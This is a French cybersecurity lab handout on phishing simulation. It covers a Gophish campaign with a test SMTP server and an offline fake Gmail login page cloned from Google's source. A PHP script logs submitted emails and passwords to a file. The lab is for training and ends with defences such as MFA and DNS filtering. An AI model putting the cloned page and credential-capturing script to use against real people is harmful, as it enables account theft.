# TP Phishing
## Créer une campagne de phishing

Dans ce TP, nous allons explorer comment créer une campagne de phishing dans un but pédagogique et éthique. L’objectif est de comprendre les méthodes utilisées par les attaquants pour inciter une cible à divulguer des informations sensibles. Il est impératif de noter que ce type d’exercice doit être réalisé avec autorisation et dans un cadre strictement contrôlé et éthique, tel qu’un environnement de test ou dans le cadre d’un audit de cybersécurité autorisé.
### Objectif pédagogique
Par la mise en place d’une campagne contrôlée avec Gophish, ce TP permet d’assimiler les mécanismes de l’hameçonnage : création d’un message et d’une page de phishing, paramétrage d’envoi et collecte de métriques. L’apprenant saura analyser le taux d’ouverture, les clics et soumissions pour identifier les vecteurs exploités et évaluer le risque.
###  Étape 1 : Préparation de l’environnement
**Installer un outil de phishing** : nous utiliserons Gophish, un outil open source et gratuit largement utilisé pour créer des campagnes de phishing. Installez Gophish sur une machine dédiée pour ce TP.
* Téléchargez Gophish depuis le site officiel : [Gophish](https://getgophish.com/)
* Décompressez le fichier téléchargé :
> `tar -xvzf gophish-vX.X.X-linux-64bit.tar.gz`
* Accédez au répertoire décompressé et lancez Gophish :
```
cd gophish-vX.X.X/ 
./gophish 
 ```
**Installer un serveur SMTP MailHog**
* Télécharger MailHog
```
wget https://github.com/mailhog/MailHog/releases/latest/download/MailHog_linux_amd64
```
* Rendre exécutable
`chmod +x MailHog_linux_amd64`
* Déplacer dans un dossier global
`sudo mv MailHog_linux_amd64 /usr/local/bin/mailhog`
* Lancer MailHog
`mailhog`
* Accéder à l’interface web
`http://localhost:8025`

###  Étape 2 : Configuration de Gophish
**Accéder à l’interface web**: ouvrez un navigateur et connectez-vous à l’interface de Gophish en utilisant l’adresse par défaut ` http://localhost:3333`. Les identifiants initiaux sont `admin` pour le nom d’utilisateur et le mot de passe est généré lors de la première exécution (enregistrez ce mot de passe).

**Configurer les paramètres SMTP**: les e-mails de phishing seront envoyés via un serveur SMTP. Configurez un serveur SMTP pour l’envoi d’e-mails de phishing.

* Allez dans `Configurations - SMTP`.
* Cliquez sur `New SMTP Server` et entrez les détails :
> Host : smtp.yourdomain.com
> Username/Password : détails d’authentification (si requis)
> Sender : une adresse e-mail factice (ex. : noreply@yourdomain.com).
> utilisez un serveur SMTP de test (par ex. : MailHog, smtp4dev, Mailtrap)

###  Étape 3 : Création de la campagne de phishing

**Créer un modèle d’e-mail** : rédigez un message convaincant.
* Allez dans `Email Templates` et cliquez sur `New Template` .
* Ajoutez un sujet attractif et un corps de message réaliste.
* Incorporez un lien vers un site de phishing (créé à l’étape suivante).
**Créer une page de phishing** : reproduisez une page de connexion légitime.
* Allez dans `Landing Pages - New Page`.
* Copiez le code source d’une page de connexion réelle (après avoir obtenu la permission appropriée) et modifiez-le pour capturer les informations d’identification saisies.

###  Étape 4 : Exécution de la campagne
**Configurer la campagne** :
* Allez dans `Campaigns - New Campaign`
* Associez le modèle d’e-mail, la liste de destinataires (seulement avec consentement) et la page de destination créée.
* Lancez la campagne et surveillez les résultats.
**Analyser les résultats** : Gophish fournira des statistiques sur l’interaction des cibles avec l’e-mail (par exemple, taux d’ouverture, clic sur le lien, soumission de données).

Ce TP vise à sensibiliser à la menace du phishing et à améliorer les défenses par des démonstrations pratiques. Rappelez-vous, l’utilisation de ces techniques sans autorisation légitime est interdite et illégale.

## Création d’une fausse page de phishing

Ce travail pratique propose de simuler une attaque de phishing dans un environnement entièrement isolé, afin de comprendre le fonctionnement d’une telle attaque dans ses aspects techniques comme humains. L’objectif est de reproduire localement une fausse page de connexion et de simuler la collecte d’identifiants de manière encadrée, dans un cadre strictement pédagogique. Aucune diffusion, aucun envoi et aucun test extérieur ne seront effectués. Le tout se déroule hors ligne, dans une machine virtuelle dédiée.

### Objectif pédagogique
Ce TP permet d’expérimenter la mise en place d’une fausse page d’authentification, en comprenant les mécanismes qui la rendent crédible aux yeux d’un utilisateur non averti. Il amène à identifier les éléments techniques exploités dans une attaque de phishing, à visualiser la logique de capture d’identifiants, et à mieux anticiper les moyens de détection et de protection associés.

### Prérequis techniques
Le travail se réalise sur une machine virtuelle Linux (Kali ou Debian). Un éditeur de texte (comme Visual Studio Code ou nano) est requis, ainsi qu’un serveur web local, tel qu’Apache ou le serveur PHP embarqué. Aucun téléchargement externe n’est nécessaire.

### Étape 1 : préparer l’environnement isolé
* Lancez une machine virtuelle (VM) sous Kali Linux
* Vérifiez qu’aucune connexion internet n’est active sur la VM
* Créez un dossier de travail dans le répertoire personnel
```
mkdir ~/phishing_lab && cd ~/phishing_lab
```
### Étape 2 : choisir une cible fictive
Pour ce TP, on utilisera l’exemple d’une page de connexion Gmail factice, à des fins uniquement éducatives. Aucun téléchargement externe n’est nécessaire. Si vous devez récupérer le fichier HTML d’exemple, téléchargez-le avant de déconnecter la VM puis coupez la connexion internet.
* Ouvrez un navigateur dans la VM.
* Tapez `view-source:https://accounts.google.com/` dans la barre d’adresse pour afficher le code source de la page.
* Copiez le code HTML complet dans un fichier nommé index.html dans le dossier phishing_lab.
### Étape 3 : nettoyer et adapter la page HTML
* Ouvrez le fichier index.html dans l’éditeur de texte
* Supprimez tous les `<script> `externes (liés à Google, captcha, etc.).
* Modifiez les champs de formulaire pour qu’ils pointent vers un fichier interne nommé `login.php`  :
 ```
  <form action="login.php" method="POST">
 ```
*  Vérifiez que les champs `name` des inputs sont bien `email` et `password`.

### Étape 4 : créer le fichier de traitement PHP
* Créez un nouveau fichier nommé `login.php` dans le dossier `phishing_lab`.
* Ajoutez le code suivant pour simuler la capture des identifiants :
```
<?php 
$email = $_POST['email']; 
$password = $_POST['password']; 
 
$file = fopen("credentials.txt", "a"); 
fwrite($file, "Email: " . $email . " | Password: " . $password . "\n"); 
fclose($file); 
 
echo "Connexion en cours..."; 
?> 
```
* Créez un fichier vide nommé credentials.txt :
`touch credentials.txt`

### Étape 5 : lancer le serveur web
* Vérifiez si Apache est installé :
`apache2ctl -v`
* Copiez le dossier de travail vers l’arborescence web :
`sudo cp -r ~/phishing_lab /var/www/html/`
* Démarrez Apache :
`sudo systemctl start apache2`
* Puis ouvrez le navigateur et accédez à la page :
`http://localhost/phishing_lab/index.html`
* Sinon (serveur PHP intégré) :
```
cd ~/phishing_lab 
php -S 127.0.0.1:8080
```
* Puis ouvrez dans le navigateur :
`http://127.0.0.1:8080/index.html`

### Étape 6 : tester la fausse page
* Saisissez des identifiants fictifs dans la page
* Validez le formulaire.
* Vérifiez que le fichier credentials.txt contient les identifiants entrés.
* Observez que la victime n’est pas redirigée : cela peut faire partie d’une amélioration ultérieure (rediriger vers une page d’erreur générique).

### Analyse de l’attaque simulée
Cette simulation montre que la technique de phishing ne dépend pas de l’injection de code complexe ou de l’exploitation d’une faille logicielle. Elle repose principalement sur l’apparence crédible de la page et la confiance de la victime dans ce qu’elle voit. Le fait de fonctionner entièrement hors ligne dans ce TP garantit une sécurité maximale tout en illustrant les étapes d’une attaque classique.

### Enseignements et protections
Dans un contexte réel, une telle page serait détectée par plusieurs mécanismes : le navigateur pourrait bloquer le domaine, l’absence de certificat TLS éveillerait les soupçons, et des outils comme le filtrage DNS ou le sandboxing des liens détecteraient la supercherie. Par ailleurs, si la cible utilise une authentification multifacteur, la récupération des seuls identifiants ne suffirait pas à compromettre le compte.

Ce TP illustre donc à la fois la simplicité d’une attaque de phishing et la nécessité d’une défense combinée : vigilance de l’utilisateur, techniques de vérification côté navigateur, et mécanismes de sécurité côté serveur.